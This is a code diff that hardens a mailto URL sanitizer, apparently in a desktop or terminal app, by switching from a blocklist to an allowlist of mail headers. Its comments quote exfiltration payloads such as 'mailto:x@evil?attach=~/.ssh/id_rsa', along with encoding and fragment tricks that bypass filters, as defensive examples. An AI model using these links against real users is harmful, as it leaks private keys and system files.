@@ -367,49 +367,56 @@ function hasControlChar(url: string): boolean {
 
 // 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
 // KMail CVE-2020-11880)。openExternal 的输入含不受信 markdown / 终端输出链接,`mailto:x@evil?attach=~/.ssh/id_rsa`
-// 经 xdg-open 交给邮件客户端即可外发私钥。统一出口删掉这些参数(各平台都做)。
-const MAILTO_BLOCKED_PARAMS = new Set(['attach', 'attachment']);
-// 键名最多解码这么多轮(防双重编码 `%2561ttach`);仍在变化 / 解码失败 → 视为可疑,删除(fail-closed)。
-const MAILTO_KEY_DECODE_ROUNDS = 4;
+// 经 xdg-open 交给邮件客户端即可外发私钥。统一出口净化(各平台都做)。
+// **白名单**而非黑名单:只留 RFC 6068 常用头,其余一律丢弃。黑名单(attach / attachment)被绕过两次 ——
+// `attach%00=`(键解码后带 NUL,不等于 attach,客户端却可能截断 / 忽略它)、`#&attach=`(见 sanitizeExternalUrl)。
+const MAILTO_ALLOWED_PARAMS = new Set(['to', 'cc', 'bcc', 'subject', 'body', 'in-reply-to']);
 
-function isBlockedMailtoKey(rawKey: string): boolean {
-  let key = rawKey;
-  for (let i = 0; i < MAILTO_KEY_DECODE_ROUNDS; i++) {
-    let next: string;
-    try {
-      next = decodeURIComponent(key);
-    } catch {
-      return true;
-    }
-    // 解码后再按 = 截一次:`attach%3D/etc/passwd` 在「先整体解码再切分」的客户端里就是 attach 参数
-    if (next === key) return MAILTO_BLOCKED_PARAMS.has(key.split('=', 1)[0]!.trim().toLowerCase());
-    key = next;
+/** 该 mailto 参数段(`key=value` 原文)是否保留。解码失败 / 解码后含控制字符 / 键不在白名单 → 丢弃(fail-closed)。 */
+function isAllowedMailtoParam(part: string): boolean {
+  const eq = part.indexOf('=');
+  let key: string;
+  let value: string;
+  try {
+    key = decodeURIComponent(eq < 0 ? part : part.slice(0, eq));
+    value = eq < 0 ? '' : decodeURIComponent(part.slice(eq + 1));
+  } catch {
+    return false;
   }
-  return true;
+  // 先查控制字符再 trim:trim 会把首尾的 Tab / LF 洗掉,`%0Asubject` 不该因此变成合法键
+  if (hasControlChar(key)) return false;
+  const name = key.trim().toLowerCase();
+  if (!MAILTO_ALLOWED_PARAMS.has(name)) return false;
+  // body 的换行(RFC 6068 规定写作 %0D%0A)与 Tab 是合法正文;其它头的值里出现 CR / LF 是头注入形态,丢弃
+  return !hasControlChar(name === 'body' ? value.replace(/[\t\r\n]/g, '') : value);
 }
 
-/** 交系统打开前的 URL 净化:mailto 删 attach / attachment 参数;其它 URL 原样返回。 */
+/**
+ * 交系统打开前的 URL 净化:mailto 只保留白名单参数并去掉 fragment;其它 URL 原样返回。
+ * 没有被丢弃内容的 mailto URL 逐字节不变。
+ */
 export function sanitizeExternalUrl(url: string): string {
   if (!startsWithAsciiIgnoreCase(url, 'mailto:')) return url;
-  const q = url.indexOf('?');
-  if (q < 0) return url;
-  const hashIdx = url.indexOf('#', q);
-  const query = url.slice(q + 1, hashIdx < 0 ? undefined : hashIdx);
-  const hash = hashIdx < 0 ? '' : url.slice(hashIdx);
-  // 按 & 与 ; 切分(部分客户端把 ; 当分隔符);未删参数保留原文、顺序与原分隔符。无可删参数 → 原样返回。
-  const parts = query.split(/([&;])/); // [段, 分隔符, 段, 分隔符, ...]
+  // mailto 没有 fragment 语义(RFC 6068 要求 # 必须编码),而不识别 fragment 的邮件客户端会把
+  // `?subject=x#&attach=/path` 里 # 之后的内容继续当参数 → # 及其后全部丢弃。
+  const hashIdx = url.indexOf('#');
+  const noHash = hashIdx < 0 ? url : url.slice(0, hashIdx);
+  const q = noHash.indexOf('?');
+  if (q < 0) return noHash;
+  // 按 & 与 ; 切分(部分客户端把 ; 当分隔符);保留的参数保持原文、顺序与原分隔符,空段原样保留。
+  const parts = noHash.slice(q + 1).split(/([&;])/); // [段, 分隔符, 段, 分隔符, ...]
   let out = '';
   let removed = false;
   for (let i = 0; i < parts.length; i += 2) {
     const part = parts[i]!;
-    if (part !== '' && isBlockedMailtoKey(part.split('=', 1)[0]!)) {
+    if (part !== '' && !isAllowedMailtoParam(part)) {
       removed = true;
       continue;
     }
     out += out === '' ? part : (parts[i - 1] ?? '&') + part;
   }
-  if (!removed) return url;
-  return url.slice(0, q) + (out !== '' ? `?${out}` : '') + hash;
+  if (!removed) return noHash;
+  return noHash.slice(0, q) + (out !== '' ? `?${out}` : '');
 }
 
 export async function openExternalUrl(
